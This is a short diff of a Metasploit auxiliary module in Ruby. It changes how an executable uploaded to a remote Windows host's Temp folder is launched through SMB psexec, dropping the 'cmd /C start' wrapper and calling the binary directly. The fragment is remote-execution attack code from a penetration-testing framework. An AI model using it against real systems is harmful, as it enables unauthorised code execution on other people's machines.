@@ -154,7 +154,8 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Executing #{@exe} on #{ip}.")
 		begin
 			# Try and run the binary
-			command = "#{@cmd} /C start C:\\WINDOWS\\Temp\\#{@exe}"
+			#command = "#{@cmd} /C start C:\\WINDOWS\\Temp\\#{@exe}"
+			command = "C:\\WINDOWS\\Temp\\#{@exe}"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
 		rescue StandardError => executeerror
